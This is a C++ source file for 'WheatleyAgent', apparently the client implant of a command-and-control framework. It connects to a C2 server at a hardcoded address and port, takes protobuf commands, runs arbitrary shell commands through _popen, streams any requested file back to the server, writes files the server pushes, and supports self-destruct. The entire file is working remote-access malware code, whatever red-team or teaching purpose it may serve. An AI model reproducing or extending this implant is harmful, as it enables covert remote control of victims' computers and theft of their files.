#include <WheatleyAgent.hpp>
#include <WheatleyProto.hpp>
#include <stdexcept>
#include <iostream>
#include <fstream>

WheatleyAgent::WheatleyAgent() : m_connection(nullptr), wasDestroyed(false)
{
}

WheatleyAgent::~WheatleyAgent()
{
}

void WheatleyAgent::run(const std::string& ip, int port)
{
    c2Connect("127.0.0.1", 0x3333);
    while (!wasDestroyed)
    {
        auto request = recvCommandRequest();
        auto response = processCommandRequest(request);
        sendCommandResponse(response);
    }
    c2Disconnect();
}

void WheatleyAgent::c2Connect(const std::string& ip, int port)
{
	m_connection.reset(new TcpConnection(ip, port));
}

void WheatleyAgent::c2Disconnect()
{
	m_connection.reset(nullptr);
}

agent::command::Request WheatleyAgent::recvCommandRequest()
{
	if (!m_connection) {
		throw std::runtime_error("Agent is not connected to a server.");
	}
	return m_connection->recvProtobuf<agent::command::Request>();
}

void WheatleyAgent::sendCommandResponse(agent::command::Response& response)
{
    if (!m_connection) {
        throw std::runtime_error("Agent is not connected to a server.");
    }
    m_connection->sendProtobuf(response);
}

agent::command::Response WheatleyAgent::processCommandRequest(agent::command::Request &request)
{
    agent::command::Response response;
    switch (request.request_case()) {

    // Self destruct command handler
    case agent::command::Request::kSelfDestroy: {
        response.mutable_self_destroy();
        handleSelfDestroy();
        break;
    }

    // Health check command handler
    case agent::command::Request::kHealthCheck: {
        response.mutable_health_check();
        break;
    }

    // Command execution handler
    case agent::command::Request::kExecute: {
        auto output = handleExecute(request.execute().command());
        response.mutable_execute()->set_output(output);
        break;
    }

    // Get file handler
    case agent::command::Request::kGetFile: {
        handleGetFile(request.get_file().path(), request.get_file().suggested_chunk_size());
        response.mutable_get_file();
        break;
    }

    // Put file handler
    case agent::command::Request::kPutFile: {
        handlePutFile(request.put_file().path());
        response.mutable_put_file();
        break;
    }

    case agent::command::Request::REQUEST_NOT_SET:
    default:
        throw std::runtime_error("Request type not set.");
    }

    return response;
}

std::string WheatleyAgent::handleExecute(const std::string &command)
{
    std::array<char, 128> buffer;
    std::string result;
    auto pipe = _popen(command.c_str(), "r");
    if (!pipe) {
        return "Error: Failed to open pipe for command execution.";
    }
    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
        result += buffer.data();
    }
    _pclose(pipe);
    return result;
}

void WheatleyAgent::handleSelfDestroy()
{
    wasDestroyed = true;
}

void WheatleyAgent::handleGetFile(const std::string& path, std::uint32_t suggestedChunkSize)
{
    std::vector<char> buffer(suggestedChunkSize);
    std::ifstream file(path, std::ios::binary);
    stream::WheatleyStreamPacket packet;

    if (!file.is_open()) {
        throw std::runtime_error("Could not open file: " + path);
    }
    while (file) {
        file.read(buffer.data(), suggestedChunkSize);
        std::streamsize bytesRead = file.gcount();
        if (bytesRead > 0) {
            packet.set_chunk(buffer.data(), bytesRead);
            packet.set_is_last(false);
            m_connection->sendProtobuf<stream::WheatleyStreamPacket>(packet);
        }
    }
    packet.set_chunk(buffer.data(), 0);
    packet.set_is_last(true);
    m_connection->sendProtobuf<stream::WheatleyStreamPacket>(packet);
}

void WheatleyAgent::handlePutFile(const std::string& path)
{
    stream::WheatleyStreamPacket packet;
    std::ofstream file(path, std::ios::binary);
    std::string chunk;
    if (!file.is_open()) {
        throw std::runtime_error("Could not open file: " + path);
    }
    do {
        packet = m_connection->recvProtobuf<stream::WheatleyStreamPacket>();
        chunk = packet.chunk();
        if (!chunk.empty()) {
            file.write(chunk.data(), chunk.size());
        }
    } while (!packet.is_last());
}
